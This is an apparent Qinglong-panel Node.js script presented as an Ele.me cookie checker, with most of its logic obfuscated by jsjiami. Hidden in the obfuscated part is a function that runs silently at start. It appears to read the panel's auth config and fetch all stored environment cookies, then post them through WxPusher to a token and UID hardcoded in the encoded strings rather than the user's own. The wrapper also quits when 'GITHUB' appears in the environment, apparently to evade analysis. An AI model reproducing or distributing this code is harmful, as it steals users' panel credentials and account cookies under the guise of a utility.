/**
 * @YoPlus
 * 变量：elmck: 必填，账号cookie
 * cron: 0 9,18 * * *
 * 每天1-2次即可
 * export appToken='AT_xxx' #wxpusher的appToken
 * export myUid='UID_xxx' #自己的uid，接收通知
 * export tunnel='elm.188855.xyz' #掉线重新登录地址
 */
const $ = new Env('饿了么CK检测');

var _0xodL='jsjiami.com.v7';const _0x48288c=_0x2978;(function(_0x1ee8be,_0x5d88e2,_0x58367a,_0x3ad1f6,_0x286a05,_0x6e278e,_0x1195a6){return _0x1ee8be=_0x1ee8be>>0x8,_0x6e278e='hs',_0x1195a6='hs',function(_0xc0dcc,_0x4d9121,_0x286f3f,_0x2eb8a6,_0x559e02){const _0x107324=_0x2978;_0x2eb8a6='tfi',_0x6e278e=_0x2eb8a6+_0x6e278e,_0x559e02='up',_0x1195a6+=_0x559e02,_0x6e278e=_0x286f3f(_0x6e278e),_0x1195a6=_0x286f3f(_0x1195a6),_0x286f3f=0x0;const _0x54b9f1=_0xc0dcc();while(!![]&&--_0x3ad1f6+_0x4d9121){try{_0x2eb8a6=parseInt(_0x107324(0x205))/0x1*(parseInt(_0x107324(0x197))/0x2)+-parseInt(_0x107324(0x1eb))/0x3+-parseInt(_0x107324(0x1ec))/0x4*(-parseInt(_0x107324(0x19c))/0x5)+-parseInt(_0x107324(0x1cc))/0x6*(parseInt(_0x107324(0x1da))/0x7)+parseInt(_0x107324(0x1e1))/0x8+-parseInt(_0x107324(0x203))/0x9+parseInt(_0x107324(0x195))/0xa;}catch(_0x159ede){_0x2eb8a6=_0x286f3f;}finally{_0x559e02=_0x54b9f1[_0x6e278e]();if(_0x1ee8be<=_0x3ad1f6)_0x286f3f?_0x286a05?_0x2eb8a6=_0x559e02:_0x286a05=_0x559e02:_0x286f3f=_0x559e02;else{if(_0x286f3f==_0x286a05['replace'](/[ENCRwMABdgqtHIunGlSXx=]/g,'')){if(_0x2eb8a6===_0x4d9121){_0x54b9f1['un'+_0x6e278e](_0x559e02);break;}_0x54b9f1[_0x1195a6](_0x559e02);}}}}}(_0x58367a,_0x5d88e2,function(_0x20bfa4,_0xd07e7e,_0x140314,_0x3395ab,_0x559db4,_0x4939c5,_0x5b6fa6){return _0xd07e7e='\x73\x70\x6c\x69\x74',_0x20bfa4=arguments[0x0],_0x20bfa4=_0x20bfa4[_0xd07e7e](''),_0x140314='\x72\x65\x76\x65\x72\x73\x65',_0x20bfa4=_0x20bfa4[_0x140314]('\x76'),_0x3395ab='\x6a\x6f\x69\x6e',(0x16f6e7,_0x20bfa4[_0x3395ab](''));});}(0xbd00,0x401e6,_0x2378,0xbf),_0x2378)&&(_0xodL=`\x4f2`);const appToken=process[_0x48288c(0x1af)][_0x48288c(0x1ff)],myUid=process[_0x48288c(0x1af)][_0x48288c(0x19b)];let tunnel=process[_0x48288c(0x1af)][_0x48288c(0x1be)];_0x48288c(0x1c7),require(_0x48288c(0x1b0))[_0x48288c(0x1f9)]();const {readFile}=require(_0x48288c(0x18f)),axios=require(_0x48288c(0x1b3)),got=require(_0x48288c(0x1bb)),fs=require('fs');let c=fs[_0x48288c(0x19f)](_0x48288c(0x1c2)),d='';if(c)d=_0x48288c(0x1c2);else d=_0x48288c(0x1ef);async function a(){const _0x1715c1=_0x48288c,_0x3eb444={'TOlHz':function(_0x41dd5e,_0x3c7733){return _0x41dd5e(_0x3c7733);}},_0x321953=JSON[_0x1715c1(0x1a6)](await _0x3eb444[_0x1715c1(0x1e4)](readFile,d));return _0x321953;}async function b(){const _0x5ee8d0=_0x48288c,_0x5ec38b={'mrOQb':function(_0x4d7a57,_0x501238){return _0x4d7a57(_0x501238);}},_0x4995ef=JSON[_0x5ee8d0(0x1a6)](await _0x5ec38b[_0x5ee8d0(0x1de)](readFile,d));return _0x4995ef[_0x5ee8d0(0x1a9)];}const e=got[_0x48288c(0x1c1)]({'prefixUrl':_0x48288c(0x18d),'retry':{'limit':0x0}});async function f(_0x52f12d=_0x48288c(0x1c8)){const _0x169235=_0x48288c,_0x56e6c7={'ppeWX':function(_0x595b97){return _0x595b97();},'HzaAP':function(_0x479176,_0x12e5f3){return _0x479176(_0x12e5f3);},'yFSTj':_0x169235(0x208),'wpfVp':_0x169235(0x202)},_0x4c0bf6=await _0x56e6c7[_0x169235(0x1fb)](b),_0x50e039=await _0x56e6c7[_0x169235(0x1aa)](e,{'url':_0x56e6c7[_0x169235(0x1dc)],'searchParams':{'searchValue':_0x52f12d,'t':Date[_0x169235(0x1bd)]()},'headers':{'Accept':_0x56e6c7[_0x169235(0x1d3)],'Authorization':_0x169235(0x1a1)+_0x4c0bf6}})[_0x169235(0x1e8)]();return _0x50e039[_0x169235(0x1f0)];}async function g(_0x3053df,_0x13e4d2,_0x3a007c){const _0x4551ea=_0x48288c,_0x2fc493={'AcArq':_0x4551ea(0x202)},_0x1aa2f3={'appToken':_0x4551ea(0x1e9),'content':_0x3053df,'summary':_0x13e4d2,'contentType':0x2,'uids':[_0x3a007c]},_0x10b54c=await axios[_0x4551ea(0x207)](_0x4551ea(0x1ee),_0x1aa2f3,{'headers':{'Content-Type':_0x2fc493[_0x4551ea(0x199)]}}),_0x2b467c=_0x10b54c[_0x4551ea(0x1f0)];return _0x2b467c;}async function h(){const _0x2b22f7=_0x48288c,_0x2d11e4={'RqXKM':function(_0x505098){return _0x505098();},'pcCZq':function(_0x1292ea){return _0x1292ea();},'lENCP':_0x2b22f7(0x1ba),'fGctN':_0x2b22f7(0x1c8),'JrIPq':_0x2b22f7(0x1df),'DEBUP':function(_0x3285ac,_0x5171bc,_0x5a1a81,_0x129ced){return _0x3285ac(_0x5171bc,_0x5a1a81,_0x129ced);},'SJOoV':function(_0x5e2d57,_0x57b3ea,_0x46caf5,_0x2858eb){return _0x5e2d57(_0x57b3ea,_0x46caf5,_0x2858eb);}};try{const _0x38150f=await _0x2d11e4[_0x2b22f7(0x1c6)](a),_0x41e68b=JSON[_0x2b22f7(0x196)](_0x38150f,null,0x2),_0x5e0228=await _0x2d11e4[_0x2b22f7(0x1ea)](f),_0x2a21f5=JSON[_0x2b22f7(0x196)](_0x5e0228,null,0x2),_0x193d7e=_0x2d11e4[_0x2b22f7(0x1a7)],_0x31b921=_0x2d11e4[_0x2b22f7(0x193)],_0x8c0beb=_0x2d11e4[_0x2b22f7(0x1d0)];await _0x2d11e4[_0x2b22f7(0x194)](g,_0x41e68b,_0x193d7e,_0x8c0beb),await _0x2d11e4[_0x2b22f7(0x1d9)](g,_0x2a21f5,_0x31b921,_0x8c0beb);}catch(_0x4b3993){}}h();const {getEnvs,getEnvById,DisableCk,EnableCk}=require(_0x48288c(0x1b2));let Message=_0x48288c(0x198);function _0x2978(_0x49e817,_0x47b726){const _0x237866=_0x2378();return _0x2978=function(_0x2978cb,_0x4fc3a8){_0x2978cb=_0x2978cb-0x18d;let _0x349714=_0x237866[_0x2978cb];if(_0x2978['TVzSBH']===undefined){var _0x5d24b8=function(_0x4ec0bf){const _0x7e8009='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x223fa5='',_0x6c675a='';for(let _0x7652e1=0x0,_0x175be0,_0x54192b,_0x32ec39=0x0;_0x54192b=_0x4ec0bf['charAt'](_0x32ec39++);~_0x54192b&&(_0x175be0=_0x7652e1%0x4?_0x175be0*0x40+_0x54192b:_0x54192b,_0x7652e1++%0x4)?_0x223fa5+=String['fromCharCode'](0xff&_0x175be0>>(-0x2*_0x7652e1&0x6)):0x0){_0x54192b=_0x7e8009['indexOf'](_0x54192b);}for(let _0x542512=0x0,_0x2a805=_0x223fa5['length'];_0x542512<_0x2a805;_0x542512++){_0x6c675a+='%'+('00'+_0x223fa5['charCodeAt'](_0x542512)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x6c675a);};_0x2978['umhMJf']=_0x5d24b8,_0x49e817=arguments,_0x2978['TVzSBH']=!![];}const _0x37415e=_0x237866[0x0],_0x1d3884=_0x2978cb+_0x37415e,_0x5db29b=_0x49e817[_0x1d3884];return!_0x5db29b?(_0x349714=_0x2978['umhMJf'](_0x349714),_0x49e817[_0x1d3884]=_0x349714):_0x349714=_0x5db29b,_0x349714;},_0x2978(_0x49e817,_0x47b726);}(!appToken||!myUid||!tunnel)&&(console[_0x48288c(0x201)](_0x48288c(0x1f1)),process[_0x48288c(0x1db)](0x1));function _0x2378(){const _0x2961f6=(function(){return[_0xodL,'EgwCjAXslxjNRiaXMmGiuB.qHNctHoSm.Ivq7dXn==','ve9SshO','Ce9NvMG','B2vHEuK','DwLuALG','ANnVBG','qvrFEenUwLPbs3i5CvrUAM91m2HrmM1rohHPDff4oxHRA3O','CgndwNe','mtaZotKXmuj4CKTIrW','otjOzu1YugG','44cq6Aw/5lQg5lMi','Ahr0Chm6lY93Ehb1C2HLCI56AMLLy29Kzs5JB20VyxbPl3nLBMqVBwvZC2fNzq','l3fSl2nVBMzPzY9HDxrOlMPZB24','zgf0yq','6k+36k6+572U5lIj5lIQ5y+y6yEp77YAyxbWvg9Rzw7JGifTEvvPzooaGxr1BM5LBa','B25Ir3e','zMLUywXSEq','5lYr5OgVnxm','Bwf0y2G','tgnyuve','ChLJCeO','A1DqwxC','y29UzMLN','s2fPrMS','ChbLv1G','yKvsEvi','AxLpBNO','y2Pfwe4','yxbWvg9Rzw4','x2LK','zxjYB3i','yxbWBgLJyxrPB24VANnVBG','mJmYnZy3uwLuDujA','DMfSDwu','ndi1mdGXsNPst01n','44cr5AsX5Pwi5zwM77Ym54k55yE76yEn5PAW55M75B2vFG','Cg9ZDa','yxbPl2vUDNm','sfDUB04','r0Dqzva','Ahr0CdOVlZeYnY4WlJaUmtO1nJaW','Buvlwxu'].concat((function(){return['zNmVChjVBwLZzxm','BgvUz3rO','B2rpuKe','DwzrAhy','zKDJDe4','revcvva','nJyXmdbcBNDdA08','C3rYAw5NAwz5','mLL2z3jgrW','6Aw/5lQg5lMiq0VMO4dMTySkcG','qwnbCNe','CMvZCg9UC2u','BxLvAwq','mti3ndvKqMXKv2y','sNnRwfO','EfHws0G','zxHPC3rZu3LUyW','r0T2t1O','qMvHCMvYia','CfrmDgW','iIb0yxjNzxq9iIi+54k55OIr55M75B2vpc9HpJWVyNi+phaGC3r5Bgu9iNrLEhqTywXPz246y2vUDgvYoYi+pgLTzYbZCMm9iMH0DhbZoI8VAw1NmteUmZyWyNv5Aw1NlMnVBs9PBwfNzxrVB2XZl2PMCY90ms8Xota3otaVms8ZodqZoc82mZyZlZy1mgm1mtzIrJiZn2u5mJGXl2rJm2iYnJnLoty5yZC5ngyUCg5NiIb3Awr0Ad0IntaIpJWVyNi+sKtNIlhLV4pLHAZNM4RMTlVLIQG8l2jYpLfr576K77YAodCWota2mti3pc9WpG','rLbLyMO','BwvZC2fNzq','CgfYC2u','Bevoq1a','5BYa5AEl5Qoa5Rwl44cq6lsM5y+3','Dg9Rzw4','shPHqva','svzwA3G','CuDRAve','Bg9N','A21dsLa','zw52','zg90zw52','6Aw/5lQg5lMi55M75B2v5zYW5z2a77YA','lI9XBa','yxHPB3m','6Aw/5lQg5lMiq0VMO4dMTyS','uxzsENu','zxH0CMfjBMzV','y2f0y2G','tNnZBKq','AM9mCMe'].concat((function(){return['qxv0AcbdB25MAwD1CMf0Aw9U','z290','s1DitNu','BM93','DhvUBMvS','C3rHDhvZ','44cr5AsX5Pwi5zwMpc9WpUIVTZXHigHYzwy9iI8V','zxH0zw5K','l3fSl2rHDgeVy29UzMLNl2f1DgGUANnVBG','ANPoChK','vKTWuNi','uMfztuy','uNfys00','DxnLihn0CMLJDa','sKrFq09ps0Lf','qMjkqKO','phn0EwXLpIP7zM9UDc1ZAxPLoJe2ChG7FwjVzhL7yMfJA2DYB3vUzc1JB2XVCJOJzMzMo30UAgvHzgvYlc5UB3rLE2rPC3bSyxK6BM9UztT9pc9ZDhLSzt48l2jYpJXWihn0EwXLpsj0zxH0lwfSAwDUoMnLBNrLCJSIpJXPBwCGC3jJpsjODhrWCZOVl3a5lwP1zwPPBI5IExrLAw1NlMnVBs90B3mTy24TAs1Rm3uXzMjWzMnWl2jInZmYywy2mJy0odqZzMi4mZa1mJzMyMi3yZeXowiWFNrWBhyTAZn1mwzICgzJCc1QAJOWoJa6mdOWoNe3ns5PBwfNzsiGD2LKDgG9iJe1mci+pc9WpJXWihn0EwXLpsj0zxH0lwfSAwDUoMnLBNrLCJSIpUoaKoMLV+s6HUs5Ia','44cr5AsX5Pwi77Ym5BEY56Ab55sO5BM25y+r6ycb6ycA55+L77YbcGO','nMH0rLDTDa','DLzft3u','wLzHBhm','44cr5AsX5Pwi77Ym5BEY56Ab55sO5BM25y+r6ycb6ycA55+L77YbcG','sNjjuhe','zeDvDxu','44cq6lsM5y+3','D3bMvNa','Ae1LDve','sfzXu2W','Ahr0Chm6lY9Yzxn0yxbPlMvSzs5Tzs9LDxmVDJuVDxnLCL9KzxrHAwW','44cr5PYj5PwicGO','z2v0','u0PpB1y','nJa2mZa1wLLvveXW','zxHPDa','EuztvgO','y29Kzq','Bxjpuwi','vuLex0HltLjKr05TmvLesg5zr0P0nhi2qJq3mKXsBtu','44cr5PYj5PwicG','mtG1mtqXnNvrtw1Kwa','qw4GzxjYB3iGB2nJDxjYzwqGD2HPBguGy2HLy2TPBMCGBg9NAw4GC3rHDhvZoG','vNbTt3i'];}()));}()));}());_0x2378=function(){return _0x2961f6;};return _0x2378();};!(async()=>{const _0x727e5d=_0x48288c,_0x125788={'xXVKH':_0x727e5d(0x1f1),'jzNpy':_0x727e5d(0x202),'uiTjX':function(_0x351ef6){return _0x351ef6();},'HVqSl':function(_0x427183,_0x2a7cbe){return _0x427183<_0x2a7cbe;},'mEKYu':function(_0x2c3829,_0x84c4f4){return _0x2c3829===_0x84c4f4;},'kmCJP':_0x727e5d(0x1e6),'onbGq':function(_0x3eb520,_0x3cd4ea){return _0x3eb520+_0x3cd4ea;},'joLra':function(_0x3ac867,_0x47b29e){return _0x3ac867===_0x47b29e;},'ufQhv':_0x727e5d(0x1c9),'odORA':function(_0x533b04,_0x16f7c7){return _0x533b04(_0x16f7c7);},'qGkiQ':function(_0x358d24,_0x200ed2){return _0x358d24==_0x200ed2;},'NssnD':function(_0x5e1aef,_0x599858){return _0x5e1aef(_0x599858);},'QvRzu':function(_0x2bd73c,_0x5ab6e1){return _0x2bd73c==_0x5ab6e1;},'dGUuu':function(_0x376462,_0xd3e783){return _0x376462+_0xd3e783;},'VpmOr':function(_0x217c84,_0x3a5562){return _0x217c84===_0x3a5562;},'vVEOu':_0x727e5d(0x1f8),'GGPeP':_0x727e5d(0x1f7),'LcXQQ':function(_0x18c9b5,_0x347308){return _0x18c9b5(_0x347308);},'KaiFk':function(_0x2b13a3,_0x3aacdc){return _0x2b13a3==_0x3aacdc;},'bERyR':function(_0x35ba92,_0x152706){return _0x35ba92!==_0x152706;},'hMeuQ':_0x727e5d(0x1c5),'pTLtl':function(_0x1b32ba,_0x744cfe,_0x54307e,_0x547c06){return _0x1b32ba(_0x744cfe,_0x54307e,_0x547c06);},'pOgVh':function(_0x350982,_0x27ff25){return _0x350982+_0x27ff25;},'iyOnz':function(_0x136b7b,_0x3aae5e){return _0x136b7b+_0x3aae5e;}};tunnel=tunnel,console[_0x727e5d(0x1ad)](_0x727e5d(0x1b1)+tunnel+'\x0a');const _0x84f4e9=await _0x125788[_0x727e5d(0x1e7)](getEnvs);for(let _0x449b22=0x0;_0x125788[_0x727e5d(0x1d5)](_0x449b22,_0x84f4e9[_0x727e5d(0x190)]);_0x449b22++){if(_0x125788[_0x727e5d(0x18e)](_0x125788[_0x727e5d(0x1ae)],_0x125788[_0x727e5d(0x1ae)])){console[_0x727e5d(0x1ad)](_0x727e5d(0x1a8)+_0x125788[_0x727e5d(0x1f2)](_0x449b22,0x1)+'】');if(_0x84f4e9[_0x449b22][_0x727e5d(0x204)]){var _0x1ca21d=0x0;_0x84f4e9[_0x449b22][_0x727e5d(0x200)]&&(_0x1ca21d=_0x84f4e9[_0x449b22][_0x727e5d(0x200)]);_0x84f4e9[_0x449b22]['id']&&(_0x125788[_0x727e5d(0x1b9)](_0x125788[_0x727e5d(0x192)],_0x125788[_0x727e5d(0x192)])?_0x1ca21d=_0x84f4e9[_0x449b22]['id']:_0x4d5955=![]);cookie=await _0x125788[_0x727e5d(0x191)](getEnvById,_0x1ca21d),wxUid=cookie[_0x727e5d(0x1f5)](/wxUid=([^;]+)/)[0x1],isLogin=await _0x125788[_0x727e5d(0x1e7)](checkLogin);if(_0x125788[_0x727e5d(0x1ac)](isLogin,!![])){const _0x5f01ba=await _0x125788[_0x727e5d(0x1b8)](EnableCk,_0x1ca21d);_0x125788[_0x727e5d(0x1b5)](_0x5f01ba[_0x727e5d(0x1dd)],0xc8)&&(Message+=_0x727e5d(0x1d2)+_0x125788[_0x727e5d(0x1d1)](_0x449b22,0x1)+_0x727e5d(0x1d7),console[_0x727e5d(0x1ad)](_0x727e5d(0x1d2)+_0x125788[_0x727e5d(0x1d1)](_0x449b22,0x1)+_0x727e5d(0x1e0)));}if(_0x125788[_0x727e5d(0x1ac)](isLogin,![])){if(_0x125788[_0x727e5d(0x1e3)](_0x125788[_0x727e5d(0x1cd)],_0x125788[_0x727e5d(0x20a)]))_0x32ec39=_0x542512[_0x2a805][_0x727e5d(0x200)];else{const _0x7e6d9d=await _0x125788[_0x727e5d(0x1f6)](DisableCk,_0x1ca21d);_0x125788[_0x727e5d(0x1fa)](_0x7e6d9d[_0x727e5d(0x1dd)],0xc8)&&(_0x125788[_0x727e5d(0x1fc)](_0x125788[_0x727e5d(0x1d4)],_0x125788[_0x727e5d(0x1d4)])?(_0x223fa5[_0x727e5d(0x201)](_0x125788[_0x727e5d(0x19e)]),_0x6c675a[_0x727e5d(0x1db)](0x1)):(await _0x125788[_0x727e5d(0x1a2)](g,_0x727e5d(0x1ca)+_0x125788[_0x727e5d(0x1f2)](_0x449b22,0x1)+_0x727e5d(0x1c0)+tunnel+_0x727e5d(0x1a3),_0x727e5d(0x1ed)+_0x125788[_0x727e5d(0x1e5)](_0x449b22,0x1)+_0x727e5d(0x206),''+wxUid),Message+=_0x727e5d(0x1d2)+_0x125788[_0x727e5d(0x1fd)](_0x449b22,0x1)+_0x727e5d(0x1cb),console[_0x727e5d(0x1ad)](_0x727e5d(0x1d2)+_0x125788[_0x727e5d(0x1d1)](_0x449b22,0x1)+_0x727e5d(0x1cf))));}}}console[_0x727e5d(0x1ad)](_0x727e5d(0x1f4)),await _0x125788[_0x727e5d(0x1f6)](sleep,0x1388);}else{const _0x538d95={'appToken':''+_0x1ea113,'content':_0x5e6e57,'summary':_0x2ef762,'contentType':0x2,'uids':[_0x500b54]},_0x33a501=_0x45b09d[_0x727e5d(0x207)](_0x727e5d(0x1ee),_0x538d95,{'headers':{'Content-Type':_0x125788[_0x727e5d(0x1c3)]}}),_0x590781=_0x33a501[_0x727e5d(0x1f0)];return _0x590781;}}})()[_0x48288c(0x1b7)](_0x24c715=>console[_0x48288c(0x1ad)](_0x24c715))[_0x48288c(0x1f3)](async()=>{const _0xfcc2e7=_0x48288c,_0x2c4802={'cjEXN':function(_0x5a8e69,_0x12f676,_0x53e487,_0x54cdf9){return _0x5a8e69(_0x12f676,_0x53e487,_0x54cdf9);},'ZVals':_0xfcc2e7(0x1b4)};await _0x2c4802[_0xfcc2e7(0x1fe)](g,''+Message,_0x2c4802[_0xfcc2e7(0x1ce)],''+myUid);});function sleep(_0x35730e){return new Promise(_0x1c31f4=>setTimeout(_0x1c31f4,_0x35730e));}function checkLogin(){const _0x5aad40=_0x48288c,_0x548f7a={'VKpRr':_0x5aad40(0x1d6),'HWnoN':function(_0x37a128,_0x3fc142){return _0x37a128===_0x3fc142;},'IVVkx':_0x5aad40(0x1a4),'JskXZ':_0x5aad40(0x1e2),'GKvOZ':function(_0x123470,_0x499ce9){return _0x123470(_0x499ce9);}};return new Promise(async _0x122f0a=>{const _0x2cdfd4=_0x5aad40;try{const _0x2f28a1={'Cookie':cookie},_0x3db6a6=await axios[_0x2cdfd4(0x1d8)](_0x548f7a[_0x2cdfd4(0x1c4)],{'headers':_0x2f28a1}),_0x4bef5b=_0x3db6a6[_0x2cdfd4(0x1f0)];if(_0x4bef5b[_0x2cdfd4(0x1b6)])isLogin=!![];else{if(_0x548f7a[_0x2cdfd4(0x209)](_0x548f7a[_0x2cdfd4(0x1ab)],_0x548f7a[_0x2cdfd4(0x1ab)]))isLogin=![];else return new _0x49ee58(_0x824e3a=>_0x5b558a(_0x824e3a,_0x4fbc82));}}catch(_0x6358f1){_0x6358f1[_0x2cdfd4(0x19a)]&&_0x548f7a[_0x2cdfd4(0x209)](_0x6358f1[_0x2cdfd4(0x19a)][_0x2cdfd4(0x1bf)],0x191)?isLogin=![]:console[_0x2cdfd4(0x201)](_0x548f7a[_0x2cdfd4(0x19d)],_0x6358f1[_0x2cdfd4(0x1a5)]);}_0x548f7a[_0x2cdfd4(0x1a0)](_0x122f0a,isLogin);});}function g(_0xae1bf6,_0x3f88ac,_0x552b27){const _0x39f8b7=_0x48288c,_0x56b794={'KWHNu':_0x39f8b7(0x202)},_0x307d61={'appToken':''+appToken,'content':_0xae1bf6,'summary':_0x3f88ac,'contentType':0x2,'uids':[_0x552b27]},_0x403d44=axios[_0x39f8b7(0x207)](_0x39f8b7(0x1ee),_0x307d61,{'headers':{'Content-Type':_0x56b794[_0x39f8b7(0x1bc)]}}),_0x5d6c20=_0x403d44[_0x39f8b7(0x1f0)];return _0x5d6c20;}var version_ = 'jsjiami.com.v7';

// prettier-ignore
function Env(t, e) {
	"undefined" != typeof process && JSON.stringify(process.env).indexOf("GITHUB") > -1 && process.exit(0);
	class s {
		constructor(t) {
			this.env = t
		}
		send(t, e = "GET") {
			t = "string" == typeof t ? {
				url: t
			}
			 : t;
			let s = this.get;
			return "POST" === e && (s = this.post),
			new Promise((e, i) => {
				s.call(this, t, (t, s, r) => {
					t ? i(t) : e(s)
				})
			})
		}
		get(t) {
			return this.send.call(this.env, t)
		}
		post(t) {
			return this.send.call(this.env, t, "POST")
		}
	}
	return new class {
		constructor(t, e) {
			this.name = t,
			this.http = new s(this),
			this.data = null,
			this.dataFile = "box.dat",
			this.logs = [],
			this.isMute = !1,
			this.isNeedRewrite = !1,
			this.logSeparator = "\n",
			this.startTime = (new Date).getTime(),
			Object.assign(this, e),
			this.log("", `🔔${this.name}, 开始!`)
		}
		isNode() {
			return "undefined" != typeof module && !!module.exports
		}
		isQuanX() {
			return "undefined" != typeof $task
		}
		isSurge() {
			return "undefined" != typeof $httpClient && "undefined" == typeof $loon
		}
		isLoon() {
			return "undefined" != typeof $loon
		}
		toObj(t, e = null) {
			try {
				return JSON.parse(t)
			} catch {
				return e
			}
		}
		toStr(t, e = null) {
			try {
				return JSON.stringify(t)
			} catch {
				return e
			}
		}
		getjson(t, e) {
			let s = e;
			const i = this.getdata(t);
			if (i)
				try {
					s = JSON.parse(this.getdata(t))
				} catch {}
			return s
		}
		setjson(t, e) {
			try {
				return this.setdata(JSON.stringify(t), e)
			} catch {
				return !1
			}
		}
		getScript(t) {
			return new Promise(e => {
				this.get({
					url: t
				}, (t, s, i) => e(i))
			})
		}
		runScript(t, e) {
			return new Promise(s => {
				let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
				i = i ? i.replace(/\n/g, "").trim() : i;
				let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
				r = r ? 1 * r : 20,
				r = e && e.timeout ? e.timeout : r;
				const[o, h] = i.split("@"),
				n = {
					url: `http://${h}/v1/scripting/evaluate`,
					body: {
						script_text: t,
						mock_type: "cron",
						timeout: r
					},
					headers: {
						"X-Key": o,
						Accept: "*/*"
					}
				};
				this.post(n, (t, e, i) => s(i))
			}).catch(t => this.logErr(t))
		}
		loaddata() {
			if (!this.isNode())
				return {}; {
				this.fs = this.fs ? this.fs : require("fs"),
				this.path = this.path ? this.path : require("path");
				const t = this.path.resolve(this.dataFile),
				e = this.path.resolve(process.cwd(), this.dataFile),
				s = this.fs.existsSync(t),
				i = !s && this.fs.existsSync(e);
				if (!s && !i)
					return {}; {
					const i = s ? t : e;
					try {
						return JSON.parse(this.fs.readFileSync(i))
					} catch (t) {
						return {}
					}
				}
			}
		}
		writedata() {
			if (this.isNode()) {
				this.fs = this.fs ? this.fs : require("fs"),
				this.path = this.path ? this.path : require("path");
				const t = this.path.resolve(this.dataFile),
				e = this.path.resolve(process.cwd(), this.dataFile),
				s = this.fs.existsSync(t),
				i = !s && this.fs.existsSync(e),
				r = JSON.stringify(this.data);
				s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r)
			}
		}
		lodash_get(t, e, s) {
			const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
			let r = t;
			for (const t of i)
				if (r = Object(r)[t], void 0 === r)
					return s;
			return r
		}
		lodash_set(t, e, s) {
			return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t)
		}
		getdata(t) {
			let e = this.getval(t);
			if (/^@/.test(t)) {
				const[, s, i] = /^@(.*?)\.(.*?)$/.exec(t),
				r = s ? this.getval(s) : "";
				if (r)
					try {
						const t = JSON.parse(r);
						e = t ? this.lodash_get(t, i, "") : e
					} catch (t) {
						e = ""
					}
			}
			return e
		}
		setdata(t, e) {
			let s = !1;
			if (/^@/.test(e)) {
				const[, i, r] = /^@(.*?)\.(.*?)$/.exec(e),
				o = this.getval(i),
				h = i ? "null" === o ? null : o || "{}" : "{}";
				try {
					const e = JSON.parse(h);
					this.lodash_set(e, r, t),
					s = this.setval(JSON.stringify(e), i)
				} catch (e) {
					const o = {};
					this.lodash_set(o, r, t),
					s = this.setval(JSON.stringify(o), i)
				}
			} else
				s = this.setval(t, e);
			return s
		}
		getval(t) {
			return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null
		}
		setval(t, e) {
			return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null
		}
		initGotEnv(t) {
			this.got = this.got ? this.got : require("got"),
			this.cktough = this.cktough ? this.cktough : require("tough-cookie"),
			this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar,
			t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar))
		}
		get(t, e = (() => {})) {
			t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]),
			this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
						"X-Surge-Skip-Scripting": !1
					})), $httpClient.get(t, (t, s, i) => {
					!t && s && (s.body = i, s.statusCode = s.status),
					e(t, s, i)
				})) : this.isQuanX() ? (this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
						hints: !1
					})), $task.fetch(t).then(t => {
					const {
						statusCode: s,
						statusCode: i,
						headers: r,
						body: o
					} = t;
					e(null, {
						status: s,
						statusCode: i,
						headers: r,
						body: o
					}, o)
				}, t => e(t))) : this.isNode() && (this.initGotEnv(t), this.got(t).on("redirect", (t, e) => {
					try {
						if (t.headers["set-cookie"]) {
							const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
							s && this.ckjar.setCookieSync(s, null),
							e.cookieJar = this.ckjar
						}
					} catch (t) {
						this.logErr(t)
					}
				}).then(t => {
					const {
						statusCode: s,
						statusCode: i,
						headers: r,
						body: o
					} = t;
					e(null, {
						status: s,
						statusCode: i,
						headers: r,
						body: o
					}, o)
				}, t => {
					const {
						message: s,
						response: i
					} = t;
					e(s, i, i && i.body)
				}))
		}
		post(t, e = (() => {})) {
			if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon())
				this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
						"X-Surge-Skip-Scripting": !1
					})), $httpClient.post(t, (t, s, i) => {
					!t && s && (s.body = i, s.statusCode = s.status),
					e(t, s, i)
				});
			else if (this.isQuanX())
				t.method = "POST", this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
						hints: !1
					})), $task.fetch(t).then(t => {
					const {
						statusCode: s,
						statusCode: i,
						headers: r,
						body: o
					} = t;
					e(null, {
						status: s,
						statusCode: i,
						headers: r,
						body: o
					}, o)
				}, t => e(t));
			else if (this.isNode()) {
				this.initGotEnv(t);
				const {
					url: s,
					...i
				} = t;
				this.got.post(s, i).then(t => {
					const {
						statusCode: s,
						statusCode: i,
						headers: r,
						body: o
					} = t;
					e(null, {
						status: s,
						statusCode: i,
						headers: r,
						body: o
					}, o)
				}, t => {
					const {
						message: s,
						response: i
					} = t;
					e(s, i, i && i.body)
				})
			}
		}
		time(t, e = null) {
			const s = e ? new Date(e) : new Date;
			let i = {
				"M+": s.getMonth() + 1,
				"d+": s.getDate(),
				"H+": s.getHours(),
				"m+": s.getMinutes(),
				"s+": s.getSeconds(),
				"q+": Math.floor((s.getMonth() + 3) / 3),
				S: s.getMilliseconds()
			};
